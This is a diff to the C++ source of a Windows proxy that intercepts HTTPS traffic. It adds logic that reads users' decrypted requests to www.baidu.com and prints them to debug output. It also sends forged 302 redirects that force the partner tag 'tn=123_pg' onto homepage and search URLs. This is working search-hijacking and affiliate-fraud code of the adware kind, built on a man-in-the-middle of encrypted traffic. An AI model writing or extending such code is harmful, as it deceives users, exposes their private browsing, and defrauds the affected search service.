@@ -4,6 +4,7 @@
 #include "stdafx.h"
 #include "TcpSocket.h"
 #include "HttpSendParser.h"
+#include "UrlParser.h"
 #include "HelpFun.h"
 #include <atlstr.h>
 
@@ -190,8 +191,12 @@ VOID WINAPI ProxyRun()
 
 #include "SSLTcpSocket.h";
 
-VOID HandleHttpsConnect( CSSLTcpSocket *pclientsock,CSSLTcpSocket *premotesock )
+VOID HandleHttpsConnect( CSSLTcpSocket *pclientsock,CSSLTcpSocket *premotesock ,LPCSTR pchHost )
 {
+	CStringA strHost;
+	strHost = pchHost;
+	
+	CStringA strClientSendBuffer;
 
 	do
 	{
@@ -238,25 +243,75 @@ VOID HandleHttpsConnect( CSSLTcpSocket *pclientsock,CSSLTcpSocket *premotesock )
 						break;
 					}
 
-					//OutputDebugStringA(chRecvBuffer);
-					//OutputDebugStringA("\r\n");
+					chRecvBuffer[nRecvLen] = 0;
+					
+					strClientSendBuffer+=chRecvBuffer;
+
+					if ( strHost == "www.baidu.com" )
+					{
+						OutputDebugStringA(chRecvBuffer);
+						OutputDebugStringA("\r\n");
+						OutputDebugStringA("--------------------------------------------------------------------------------------------------");
+						OutputDebugStringA("\r\n");
+					}
+					
 					//DebugStringA("clientSock RecvData %d",nRecvLen);
 					
 					BOOL bTransmitData = TRUE;
 					CHttpSendParser sendparser;
-					if(sendparser.ParseData(chRecvBuffer,nRecvLen))
+					if(sendparser.ParseData(strClientSendBuffer,strClientSendBuffer.GetLength()))
 					{
-						CStringA strUrl;
-						strUrl = sendparser.GetParseUrl();
-						OutputDebugStringA("Url: "+strUrl+"\r\n");
-						if ( 
-							(strUrl.Find("www.baidu.com/?tn=") >= 0 && strUrl.Find("www.baidu.com/?tn=123_pg") < 0)
-							|| strUrl == "http://www.baidu.com/"
-							)
+						strClientSendBuffer="";
+
+ 						CStringA strUrl;
+ 						strUrl = sendparser.GetParseUrl();
+ 						OutputDebugStringA("Url: "+strUrl+"\r\n");
+// 						if ( 
+// 							(strUrl.Find("www.baidu.com/?tn=") >= 0 && strUrl.Find("www.baidu.com/?tn=123_pg") < 0)
+// 							|| strUrl == "http://www.baidu.com/"
+// 							)
+// 						{
+// 							bTransmitData = FALSE;
+// 							LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
+// 							pclientsock->SendData((PVOID)pchResponseData,strlen(pchResponseData));
+// 						}
+
+						CUrlParser urlparser;
+						urlparser.SetUrl(strUrl);
+						urlparser.ParseUrl();
+						CStringA strPath;
+						strPath = urlparser.GetPath();
+
+						if ( strPath == "/" )
 						{
-							bTransmitData = FALSE;
-							LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
-							pclientsock->SendData((PVOID)pchResponseData,strlen(pchResponseData));
+							CStringA strPid;
+							urlparser.GetParamValueByName("tn",strPid);
+							if ( strPid.CompareNoCase("123_pg") != 0 )
+							{
+								LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
+								pclientsock->SendData((PVOID)pchResponseData,strlen(pchResponseData));
+								bTransmitData = FALSE;
+							}
+
+							
+						}
+
+						if ( strPath == "/s" )
+						{
+							CStringA strPid;
+							urlparser.GetParamValueByName("tn",strPid);
+							if ( strPid.CompareNoCase("123_pg") != 0 )
+							{
+								CStringA strNewUrl;
+								urlparser.SetParamValueByName("tn","123_pg");
+								strNewUrl = urlparser.BuildUrl();
+								strNewUrl.Replace("http://","https://");
+								CStringA strReponseData;
+								strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\n\r\n",strNewUrl);
+
+								pclientsock->SendData((PVOID)strReponseData.GetBuffer(),strReponseData.GetLength());
+								bTransmitData = FALSE;
+							}
 						}
 
 					}
@@ -323,16 +378,46 @@ DWORD WINAPI HttpsRequestHandleThread( PVOID pParam )
 			CStringA strUrl;
 			strUrl = sendparser.GetParseUrl();
 			OutputDebugStringA("Url: "+strUrl+"\r\n");
-			if (
-				(strUrl.Find("www.baidu.com/?tn=") >= 0 && strUrl.Find("www.baidu.com/?tn=123_pg") < 0)
-				|| strUrl == "http://www.baidu.com/"
-				)
-			{
-				//bTransmitData = FALSE;
-				LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
-				psslclient->SendData((PVOID)pchResponseData,strlen(pchResponseData));
 
-				return 0;
+			if (strHost == "www.baidu.com")
+			{
+				CUrlParser urlparser;
+				urlparser.SetUrl(strUrl);
+				urlparser.ParseUrl();
+				CStringA strPath;
+				strPath = urlparser.GetPath();
+
+				if ( strPath == "/" )
+				{
+					CStringA strPid;
+					urlparser.GetParamValueByName("tn",strPid);
+					if ( strPid.CompareNoCase("123_pg") != 0 )
+					{
+						LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
+						psslclient->SendData((PVOID)pchResponseData,strlen(pchResponseData));
+					}
+					//bTransmitData = FALSE;
+
+					return 0;
+				}
+
+				if ( strPath == "/s" )
+				{
+					CStringA strPid;
+					urlparser.GetParamValueByName("tn",strPid);
+					if ( strPid.CompareNoCase("123_pg") != 0 )
+					{
+						CStringA strNewUrl;
+						urlparser.SetParamValueByName("tn","123_pg");
+						strNewUrl = urlparser.BuildUrl();
+						strNewUrl.Replace("http://","https://");
+						CStringA strReponseData;
+						strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\n\r\n",strNewUrl);
+						
+						psslclient->SendData((PVOID)strReponseData.GetBuffer(),strReponseData.GetLength());
+					}
+				}
+
 			}
 
 
@@ -350,7 +435,7 @@ DWORD WINAPI HttpsRequestHandleThread( PVOID pParam )
 
 		int nRet = psslremote->SendData((PVOID)chReadBuffer,nReadTotalLen);
 
-		HandleHttpsConnect(psslclient,psslremote);
+		HandleHttpsConnect(psslclient,psslremote,strHost);
 	}
 
 
